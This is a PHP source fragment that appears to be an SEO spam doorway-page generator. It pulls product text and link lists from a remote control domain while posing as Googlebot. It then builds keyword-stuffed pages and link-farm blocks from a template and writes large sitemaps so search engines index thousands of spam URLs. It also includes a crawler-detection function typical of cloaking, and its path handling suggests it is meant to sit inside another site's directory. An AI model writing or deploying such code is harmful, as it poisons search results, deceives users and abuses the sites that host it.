 $keyKey = $id23 % $numArr_key;$keyWzi = $id23 % 6;$preOrEnd = $arrKeywz[$keyWzi]%2;$pInfoUrl =  GETDOM . "gpage.php?id=$siteAID&jgnum=". JGNUM ."&linknum=".LINKNUM; $pInfoStr = curl_get_from_webpage($pInfoUrl,'',5);$rName = '#<llqpname>(.*?)</llqpname>#s';preg_match($rName, $pInfoStr, $matchName);if($matchName[1]) $pName = trim($matchName[1]);$rCat = '#<llqcat>(.*?)</llqcat>#s';preg_match($rCat, $pInfoStr, $matchCat);if($matchCat[1]) $pCat = trim($matchCat[1]);$rDes = '#<llqpdes>(.*?)</llqpdes>#s';preg_match($rDes, $pInfoStr, $matchDes);if($matchDes[1]) $pDes = $matchDes[1];$rpd2 = '#<llqpd2>(.*?)</llqpd2>#s';preg_match($rpd2, $pInfoStr, $matchpd2);if($matchpd2[1]) $pd2 = $matchpd2[1];else $pd2 =  '';$rKey = $arr_key[$keyKey];$rImg = '#<llqpimg>(.*?)</llqpimg>#si';preg_match($rImg, $pInfoStr, $matchImg);if($matchImg[1]) $pImg = $matchImg[1];$rFL = '#<llqFL>(.*?)</llqFL>#si';preg_match($rFL, $pInfoStr, $matchFL);if($matchFL[1]) $fStr = $matchFL[1];else $fStr = ''; if($preOrEnd){$rPlaceTitle = $pName . $rKey;}else{$rPlaceTitle = $rKey . $pName;}$rPlacePname = $rPlaceTitle;$keywordKey = get_arrvs($arr_key,1*KEYJG,$keyKey);$rPlaceKey = $pName.",".$rKey.",".$keywordKey;$desKey1 = get_arrvs($arr_key,2*KEYJG,$keyKey);$desKey2 = get_arrvs($arr_key,3*KEYJG,$keyKey);$rPlaceDes = $pName.",".$rKey.",".$desKey1.",".$desKey2;list($Sid,$Pid) = explode('-',$siteAID);$CurrentLink = getalink($Sid,$Pid);$pDes = str_ireplace("<img ", "<a href=\"".$CurrentLink."\"><br/>".'<img alt="#bbbtitlebbb#"  title="#bbbtitlebbb#" ',$pDes);$pDes = str_ireplace(".jpg\"><br/>",".jpg\"></a><br/>" ,$pDes);$myLink = '<a href="#">#bbbtitlebbb#</a><br/>';$rpDes = $myLink.$pDes.$pd2.'';if(!strstr($rpDes,$pImg)){$rpDes .= PHP_EOL ."<br/>"."<a href=\"".$CurrentLink."\"><br/>".'<img alt="#bbbtitlebbb#" title="#bbbtitlebbb#" src="'.$pImg.'">'."</a><br/>";}$rpDes = str_replace($pName,$rPlacePname,$rpDes);$rpDes = str_replace('#bbbtitlebbb#',$rPlacePname,$rpDes);$arrf1 = explode("#llqllqllq#",$fStr);$arrF2s = array();if(count($arrf1)){foreach($arrf1 as $values){$values = trim($values);$arrts = explode("===>",$values);if(count($arrts) == 2)$arrF2s[$arrts[0]] = $arrts[1];}}$arrPre = array_slice($arrF2s, 0, LINKNUM);$arrNext = array_slice($arrF2s, LINKNUM);$pCat = str_replace('index.php?category=','/index.php?category=',$pCat);	
	
	if(count($arrPre)){
		$linkfirst = '';
		$itemp = 0;		foreach($arrPre as $valueFlinkId => $vsss){
			list($tempSid,$tempPid) = explode('-',$valueFlinkId);						
			$friendlink = getalink($tempSid,$tempPid);			
			$keyKey = $tempPid % $numArr_key;			
			$keyWzi2 = $tempPid % 6;			if($arrKeywz[$keyWzi2]%2){
				$tempLinkKey = trim($arrF2s[$valueFlinkId]) . $arr_key[$keyKey];			}else{
				$tempLinkKey = $arr_key[$keyKey] . trim($arrF2s[$valueFlinkId]);			}
			
			if($itemp%2)$itempName = $pName.get_arrvs($arr_key,(4+$itemp++)*KEYJG,$keyKey);else $itempName = get_arrvs($arr_key,(4+$itemp++)*KEYJG,$keyKey).$pName;
			
			
			$linkfirst=$linkfirst."<a href=\"".$friendlink."\">". $tempLinkKey ."</a><br/>". $itempName ."<br/>".PHP_EOL;		}
	}
		
		
	if(count($arrNext)){
					$linklast = '';

		foreach($arrNext as $valueFlinkId => $vsss){
			list($tempSid,$tempPid) = explode('-',$valueFlinkId);			$friendlink = getalink($tempSid,$tempPid);
			
			$keyKey = $tempPid % $numArr_key;			
			$keyWzi2 = $tempPid % 6;			if($arrKeywz[$keyWzi2]%2){
				$tempLinkKey = trim($arrF2s[$valueFlinkId]) . $arr_key[$keyKey];			}else{
				$tempLinkKey = $arr_key[$keyKey] . trim($arrF2s[$valueFlinkId]);			}
			
			$linklast=$linklast."<a href=\"".$friendlink."\">". $tempLinkKey ."</a><br/>".PHP_EOL;		}
	}
		
		$fileMb = fopen("moban.html","r");		$html = fread($fileMb,filesize("moban.html"));		
			$html = str_ireplace('#bbbtitlebbb#</h1>', '#bbbtitlebbb#</h1>'.$pCat, $html);			$html = str_ireplace('#bbbtitsbbb#', $rPlacePname.' - '.$_SERVER['HTTP_HOST'], $html);			$html = str_ireplace('#bbbtitlebbb#', $rPlacePname, $html);			$html = str_replace('#bbbtitlebbb#', $rPlacePname, $html);			$html = str_ireplace('#bbbkeybbb#', $rPlaceKey, $html);			$html = str_ireplace('#bbbdesbbb#', $rPlaceDes, $html);
			
			
			$html = str_ireplace('友链1', $linkfirst, $html);			$html = str_ireplace('友链2', $linklast, $html);			$html = str_ireplace('#content#', $fcontent, $html);			$html = str_ireplace('描述', $rpDes, $html);			
 
		
echo $html;
die();
	
	
	
function getMapNum($bgNum){
	$TempArr = array();
	if($bgNum + 9 <= FNUM){
		for($i=0;$i<20;$i++){
			$TempArr[$i] = $bgNum + $i -1;
		}
	}else{
		for($i=0;$i<20;$i++){
			if($bgNum+$i > FNUM)
				$TempArr[$i] = $bgNum + $i -1 -FNUM;
			else
				$TempArr[$i] = $bgNum + $i -1;
		}
	}
	
	return $TempArr;
}


function getRandId(){
	$num = rand(1,FNUM);	$num = $num - 1;	require(FILEDIRNAME . "/id$num.php");	$indexId=array_rand($arrId,1);	$id = $arrId[$indexId];	unset($arrId);	return $id;}
function get_arrvs($arr,$num,$nowkey){
	$numArr = count($arr);	
	if($nowkey + $num < $numArr)
		return $arr[$nowkey + $num];	else{
		if($nowkey + $num - $numArr - $numArr > 0)
			return get_arrvs($arr,$num - $numArr,$nowkey);		else
			return $arr[abs($nowkey + $num - $numArr)];	}
}

function get_pre_link($arr,$key){
	
	$tmpA1 = array();	$tmpA2 = array();	
	$num = count($arr);	
	
	if($key + JGNUM + 1 + LINKNUM >= $num){
		
		if($key + JGNUM + 1 - $num > LINKNUM){
			return array_slice($arr, $key + JGNUM + 1 - $num, LINKNUM);		}else{
		
		$duoyu = $key + JGNUM + 1 + LINKNUM - $num + 1;		$tmpA1 = array_slice($arr, $key + JGNUM + 1, LINKNUM);		$tmpA2 = array_slice($arr, 0, $duoyu);			
		return array_merge($tmpA1,$tmpA2);		}
	}else{
			return  array_slice($arr, $key + JGNUM + 1, LINKNUM);	}
	
}
function get_next_link($arr,$key){
	
	$tmpA1 = array();	$tmpA2 = array();	
	$num = count($arr);	if($key - JGNUM - LINKNUM < 0 && $key - JGNUM > 0){
		$duoyu = abs($key - JGNUM - LINKNUM);		$tmpA1 = array_slice($arr, 0, abs($key - JGNUM));		$tmpA2 = array_slice($arr, $num-$duoyu-1, $duoyu);		return array_merge($tmpA1,$tmpA2);	}else{
			return  array_slice($arr, $key - JGNUM - LINKNUM, LINKNUM);	}
}
function isCrawler() {
	$agent= @strtolower($_SERVER['HTTP_USER_AGENT']);	if (!empty($agent)) {
		$spiderSite= array(
			"Googlebot",
			"Mediapartners-Google",
			"Adsbot-Google",
			"Yahoo!",
			"Yahoo Slurp",
			"bingbot",
			"MSNBot"
		);		foreach($spiderSite as $val) {
		$str = strtolower($val);		if (strpos($agent, $str) !== false) {
			return true;			}
		}
	} else {
		return false;	}
} 
function glink($filenames,$jdt=1){
	$filePres = '';	$fileEnds = '';	
	if($jdt == 1){
		$filePres = basename(__FILE__) . "?id=";	}else{
		$filePres = '';		$fileEnds = JTHZ;	}
	////获取文件目录
	$fpath='http://'.$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'];	$serpath=substr($fpath,0,strrpos($fpath,'/'));
	$siteLink='http://'.$_SERVER['HTTP_HOST'];		
	$put_str = '';
	$urlsArray = $filenames;	//print_r($urlsArray);
	$numLinks = count($urlsArray);	
	foreach($urlsArray as $value){
		$curphp=basename(__FILE__); 
		$first=stristr($value,".php");		$last=stristr($value,".xml");		$checkTxt =stristr($value,".txt");		//print_r( $value.$curphp."   ".$first."   ".$last);		if($first===false && $last===false && $checkTxt===false)
		{
			
			$url=$serpath ."/". $filePres . PRENAME . '-' . basename($value) .$fileEnds;			$put_str .= $url . PHP_EOL;				
		}
	}
		$gFile =  'urls.txt';		echo '<br/>'.$gFile.'';
		@unlink($gFile);		file_put_contents($gFile,$put_str);		echo "生成成功！<br/>";	
}
//生成sitemap.xml文件，超出4000个则换一个xml文件；参数$c=1生成原始路径的sitemap，$c=2则生成映射后的路径
//$dir目录参数
function gsitemap2($filenames,$c=1,$jdt=1){
	global $gnumber,$arrArrr;
	$filePres = '';	$fileEnds = '';	
	$dirNames = dirname(__FILE__);	$httcReplace = end((explode(DIRECTORY_SEPARATOR, $dirNames)));			
	if(JDT == 2){
		$filePres = $httcReplace . "/" . basename(__FILE__) . "/";	}elseif(JDT == 1){
		$filePres = $httcReplace . "/";	}elseif(JDT == 3){
		$filePres = $httcReplace . "/" .basename(__FILE__) . "?key=";	}else{
		$filePres = '';	}
	if(JDT == 3){
		$fileEnds = '';	}else{
		$fileEnds = JTHZ;	}
	$fpath='http://'.$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'];	$serpath=substr($fpath,0,strrpos($fpath,'/'));
	$siteLink='http://'.$_SERVER['HTTP_HOST'];		
	$mapPre = '<?xml version="1.0" encoding="UTF-8" ?>'. PHP_EOL.'<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">' . PHP_EOL;	$mapEnd = PHP_EOL .  '</urlset>';
	// $urlsArray = $filenames;
	// $numLinks = count($urlsArray);
	$star = 0;	$priority = 0.1;	$starPri = 0;	$gFile ="";	$date = date("Y-m-d");	$time = date("H:i:s");
	$str = "";						
	$tempArr1 = $filenames;
	
	foreach($tempArr1 as $value2){
		$curphp=basename(__FILE__); 
		$value = $value2;		$first=stristr($value,".php");		$last=stristr($value,".xml");		$checkTxt =stristr($value,".txt");		list($tempSid,$tempPid) = explode('-',$value);
				$url = getalink($tempSid,$tempPid);
		
		
		
		if($first===false && $last===false && $checkTxt===false)
		{
			$date = date("Y-m-d");			$time = date("H:i:s");				
		
			if($star % 12000==11999){
				$gFile =  '../sitemap/map' . $gnumber .'.xml';				echo '<br/>'.$gFile.'<br/>';				$put_str = $mapPre . $str . $mapEnd;				@unlink($gFile);				file_put_contents($gFile,$put_str);
				$str = '';				$gnumber++;				return;			}
			
		
			
	
			$str .= "     <url>
			 <loc>" . $url . "</loc> 
			 <lastmod>". $date . "T" . $time ."-05:00</lastmod>   
			 <changefreq>daily</changefreq> 
			 <priority>0.1</priority> 
			 </url>
		";	
			
			
			$star++;			$starPri++;		}
	}
	
	{
		$gFile =  '../sitemap/map' . $gnumber .'.xml';		$gnumber++;		echo '<br/>'.$gFile.'<br/>';
		$put_str = $mapPre . $str . $mapEnd;		@unlink($gFile);		file_put_contents($gFile,$put_str);	
	}
	
	unset($tempArr1);	unset($filenames);	
	echo "生成sitemap成功！";	
}
function gsitemap($filenames,$c=1,$jdt=1){
	global $gnumber,$arrArrr;	
	$filePres = '';	$fileEnds = '';	
	
	$fpath='http://'.$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'];	$serpath=substr($fpath,0,strrpos($fpath,'/'));
	$siteLink='http://'.$_SERVER['HTTP_HOST'];		
	$mapPre = '<?xml version="1.0" encoding="UTF-8" ?>'. PHP_EOL.'<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">' . PHP_EOL;	$mapEnd = PHP_EOL .  '</urlset>';
	// $urlsArray = $filenames;
	// $numLinks = count($urlsArray);
	
	$star = 0;	$priority = 0.9;	$starPri = 0;	$gFile ="";	$date = date("Y-m-d");	$time = date("H:i:s");
	$str = "     <url>
			 <loc>" . $siteLink . "</loc> 
			 <lastmod>". $date . "T" . $time ."-05:00</lastmod> 
			 <changefreq>always</changefreq> 
			 <priority>1.0</priority> 
			 </url>
		";						
	$tempArr1 = $filenames;
	
	foreach($tempArr1 as $value2){
		$curphp=basename(__FILE__); 
		$value = $value2;		$first=stristr($value,".php");		$last=stristr($value,".xml");		$checkTxt =stristr($value,".txt");		list($tempSid,$tempPid) = explode('-',$value);		
		$url = getalink($tempSid,$tempPid);	
		
		if($first===false && $last===false && $checkTxt===false)
		{
			$date = date("Y-m-d");			$time = date("H:i:s");			
	
			if($star % 12000==11999){
				$gFile =  '../sitemap/map' . $gnumber .'.xml';				echo '<br/>'.$gFile.'<br/>';				
				$put_str = $mapPre . $str . $mapEnd;				@unlink($gFile);				file_put_contents($gFile,$put_str);
				$str = '';				$gnumber++;				return;				
			}
			
			if($starPri >= 400 && $priority != 0.1){
				$starPri = 0;				$priority = $priority - 0.1;			}
			
			if($priority > 0.1){
				
				$str .= "     <url>
					 <loc>" . $url . "</loc> 
					 <lastmod>". $date . "T" . $time ."-05:00</lastmod>   
					 <changefreq>daily</changefreq> 
					 <priority>". $priority . "</priority> 
					 </url>
				";	
			}else{
										$str .= "     <url>
			 <loc>" . $url . "</loc> 
			 <lastmod>". $date . "T" . $time ."-05:00</lastmod>   
			 <changefreq>daily</changefreq> 
			 <priority>0.1</priority> 
			 </url>
		";	
			}
			
			$star++;			$starPri++;		}
	}
	
	{
		$gFile =  '../sitemap/map' . $gnumber .'.xml';		echo '<br/>'.$gFile.'<br/>';		
		$gnumber++;
		$put_str = $mapPre . $str . $mapEnd;		@unlink($gFile);		file_put_contents($gFile,$put_str);	
	}
	
	unset($tempArr1);	unset($filenames);	echo "生成sitemap成功！";	
}
  function rmhtmltag2($tagname='',$str=''){
		$rulers = '#<'.$tagname.'[^>]*>#s';		$str = preg_replace($rulers,'',$str);		$rulers = '#</'.$tagname.'>#s';		$str = preg_replace($rulers,'',$str);	
	$rulers = '#<'.$tagname.'[^>]*>#i';	$str = preg_replace($rulers,'',$str);	$rulers = '#</'.$tagname.'>#i';	$str = preg_replace($rulers,'',$str);	return $str;	
	}
	
	function rmhtmltag($tagname='',$str=''){
		$rulers = '#<'.$tagname.'[^>]*>.*?</'.$tagname.'>#s';		$str = preg_replace($rulers,'',$str);		$rulers = '#<'.$tagname.'[^>]*>.*?</'.$tagname.'>#i';		$str = preg_replace($rulers,'',$str);		return $str;	
	}
  
function fillUrl($str = '', $url){
	$relur = '#(?:href|src) ?= ?"([^"]+)"#s';	
	$urlInfo = parse_url($url);	
	
	preg_match_all($relur, $str, $matches);
	if(count($matches[1])){
		foreach($matches[1] as $values){
			if(!strstr($values, "//") && !strstr($values, "..")){
				$rStr =  $urlInfo['host']."/".$values;				$rStr =  'http://' . str_replace('//','/',$rStr);				
				$str = str_replace('"'.$values.'"', '"'.$rStr.'"' , $str) ;			}elseif(strstr($values, "..")){
				
				// echo $urlInfo['host'];				// echo str_replace(basename($url),"",$url);				// die();				
				$rStr = str_replace(basename($url),"",$url)."/".$values;				
				
				$rStr = str_replace("http://","<llqhttp>",$rStr);				
				$rStr = str_replace("https://","<llqhttps>",$rStr);				
				$rStr = str_replace("//","/",$rStr);				
				$rStr = str_replace("<llqhttps>","https://",$rStr);				
				$rStr = str_replace("<llqhttp>","http://",$rStr);				
				$str = str_replace('"'.$values.'"', '"'.$rStr.'"' , $str) ;			}
		}
	}	
	
	
	$relur = '#(?:href|src) ?= ?\'([^\']+)\'#s';	
	$urlInfo = parse_url($url);	
	
	preg_match_all($relur, $str, $matches);	
	// print_r($matches[1]);	
	if(count($matches[1])){
		foreach($matches[1] as $values){
			if(!strstr($values, "//") && !strstr($values, "..")){
					$rStr =  $urlInfo['host']."/".$values;				$rStr =  'http://' . str_replace('//','/',$rStr);				$str = str_replace("'".$values."'", "'".$rStr."'" , $str) ;			}elseif(strstr($values, "..")){
				
				$rStr = str_replace(basename($url),"",$url)."/".$values;				
				
				$rStr = str_replace("http://","<llqhttp>",$rStr);				
				$rStr = str_replace("https://","<llqhttps>",$rStr);				
				$rStr = str_replace("//","/",$rStr);				
				$rStr = str_replace("<llqhttps>","https://",$rStr);				
				$rStr = str_replace("<llqhttp>","http://",$rStr);				
				$str = str_replace("'".$values."'", "'".$rStr."'" , $str) ;			}
		}
	}
	return $str;}
function auto_read($str, $charset='UTF-8') {
	$list = array('EUC-JP', 'Shift_JIS', 'UTF-8',  'iso-2022-jp');
	$encode = mb_detect_encoding($str, $list);	// echo $encode;die();	
	if($encode == 'UTF-8'){
		return $str;	}else{
		return mb_convert_encoding($str, $charset, $encode);	}
	 
}
function detect_encoding($file){
	$list = array('GBK', 'UTF-8', 'UTF-16LE', 'UTF-16BE', 'ISO-8859-1');	$str = file_get_contents($file);	foreach ($list as $item) {
		$tmp = mb_convert_encoding($str, $item, $item);		if (md5($tmp) == md5($str)) {
		
			return $item;		}
	}
	return null;}
function curl_get_from_webpage($url,$proxy='',$loop=10){
	$data = false;        $i = 0;        while(!$data) {
             $data = curl_get_from_webpage_one_time($url,$proxy);             if($i++ >= $loop) break;        }
	return $data;}
 
 
function curl_get_from_webpage_one_time($url,$proxy=''){
if(function_exists("curl_init") && function_exists("curl_setopt") && function_exists("curl_exec") && function_exists("curl_close")){
 
    $curl = curl_init();	//如果有用代理,则使用代理.
	$user_agent = "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)";				$urlReferer = "http://www.google.com";
	if(strlen($proxy) > 8) curl_setopt($curl, CURLOPT_PROXY, $proxy);	
curl_setopt($curl, CURLOPT_URL, $url);curl_setopt($curl, CURLOPT_HEADER, false);curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);curl_setopt($curl, CURLOPT_REFERER, $urlReferer);curl_setopt($curl, CURLOPT_USERAGENT, $user_agent);$data=curl_exec($curl);curl_close($curl); 
  }else{
 
    $is_auf=ini_get('allow_url_fopen') && function_exists("file_get_contents")?true:false; 
    if($is_auf){
 
		$data = file_get_contents($url); 
    }
 
  }
	if(!$data) return false;
	return $data;	
	
}
	function getalink($sid,$pid){
		
		global $arrnametime,$arrKeywz,$arr_word,$strRand;		
	
		$filePres = '';		$fileEnds = '';		$siteLink='http://'.$_SERVER['HTTP_HOST'];
		$dirNames = dirname(__FILE__);		$httcReplace = end((explode(DIRECTORY_SEPARATOR, $dirNames)));		
		if(JDT == 2){
			$filePres = $siteLink ."/". $httcReplace . "/" . basename(__FILE__) . "/";		}elseif(JDT == 1){
			$filePres = $siteLink ."/". $httcReplace . "/";		}elseif(JDT == 3){
			$filePres = $siteLink ."/". $httcReplace . "/" .basename(__FILE__) . "?keyword=";		}else{
			$filePres = $siteLink."/";		}
		
		$ms = $arrnametime[$pid % count($arrnametime)];		
		
		$keyNum = $arrKeywz[$pid % count($arrKeywz)];		
		$keyWordKey = $pid % 10;		$keyStrKey = $pid % strlen("icedrkswzjhpnxoyvumfatblgq");		$keyArr = array();		$flag = 0;		
		if($ms == 2 or $ms ==4){
			if($keyNum >= 9){
				$fg = 4;			}elseif($keyNum >= 7){
				 $fg = 3;			}else{
				 $fg = 2;			}
		}
		
		for($i=0;$i<$keyNum;$i++){
			$tempNum = $arr_word[$i][$keyWordKey];			$tempstr = '';			for($j=0;$j<$tempNum;$j++)
				$tempstr .= $strRand[$flag++]{$keyStrKey};			
			$keyArr[$i] = $tempstr;		}
		
		$SidWz = $sid % $keyNum;		$PidWz = $pid % $keyNum;		$linkCenter = '';
		
		if(JDT == 3){
			for($i=0;$i<$keyNum;$i++){
				
				if($SidWz == $i)
					$linkCenter .= BZSITE . $sid .'-';				
				if($PidWz == $i)
					$linkCenter .= BZPRO . $pid .'-';				
				
				$linkCenter .= $keyArr[$i] .'-';			}
			$linkCenter .= $linkCenter . "#llq";			$linkCenter = str_replace('-#llq','',$linkCenter);			return $filePres.$linkCenter;		}
		
		
		
		
		if($ms == 1){
			for($i=0;$i<$keyNum;$i++){
				
				if($SidWz == $i)
					$linkCenter .= BZSITE . $sid .'-';				
				if($PidWz == $i)
					$linkCenter .= BZPRO . $pid .'-';				
				
				$linkCenter .= $keyArr[$i] .'-';
			}
			
			$linkCenter .= "/";			$linkCenter = str_replace("-/","/",$linkCenter);			
		}elseif($ms == 2){
			for($i=0;$i<$keyNum;$i++){
				
				if($SidWz == $i)
					$linkCenter .= BZSITE . $sid .'-';				
				if($PidWz == $i)
					$linkCenter .= BZPRO . $pid .'-';				
				
				$linkCenter .= $keyArr[$i] .'-';				if($i == $fg-1){
					$linkCenter .= '/';				}
			}
			
			$linkCenter .= "/";			$linkCenter = str_replace("-/","/",$linkCenter);			
		}elseif($ms == 3){
			for($i=0;$i<$keyNum;$i++){
				
				if($SidWz == $i)
					$linkCenter .= BZSITE . $sid .'-';				
				if($PidWz == $i)
					$linkCenter .= BZPRO . $pid .'-';				
				
				$linkCenter .= $keyArr[$i] .'-';
			}
			
			$linkCenter .= JTHZ;			$linkCenter = str_replace("-".JTHZ,JTHZ,$linkCenter);			
			
		}elseif($ms == 4){
				for($i=0;$i<$keyNum;$i++){
				
				if($SidWz == $i)
					$linkCenter .= BZSITE . $sid .'-';				
				if($PidWz == $i)
					$linkCenter .= BZPRO . $pid .'-';				
				
				$linkCenter .= $keyArr[$i] .'-';				if($i == $fg-1){
					$linkCenter .= '/';				}
			}
			
			$linkCenter .= JTHZ;			$linkCenter = str_replace("-/","/",$linkCenter);			$linkCenter = str_replace("-".JTHZ,JTHZ,$linkCenter);		}
		
		return $filePres.$linkCenter;
	}
	
	
function is_ip($localIp,$ipRanges)
{    
	$localIp = ip2long($localIp);  
	foreach($ipRanges as $val)
	{ 
		$ipmin=sprintf("%u",ip2long($val[0]));		$ipmax=sprintf("%u",ip2long($val[1]));
		if($localIp >= $ipmin && $localIp <= $ipmax)
		{   
			return true; 
		} 
	}   
	return false;}
 
 
function get_real_ip(){
	
	$ip=false;	if(!empty($_SERVER["HTTP_CLIENT_IP"])){
		$ip = $_SERVER["HTTP_CLIENT_IP"];	}
	
	if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
		$ips = explode (", ", $_SERVER['HTTP_X_FORWARDED_FOR']);		if ($ip) { array_unshift($ips, $ip); $ip = FALSE; }
		
		for ($i = 0; $i < count($ips); $i++) {
			if (!eregi ("^(10|172\.16|192\.168)\.", $ips[$i])) {
				$ip = $ips[$i];				break;			}
		}
	}
	
	return ($ip ? $ip : $_SERVER['REMOTE_ADDR']);}
 
//file end
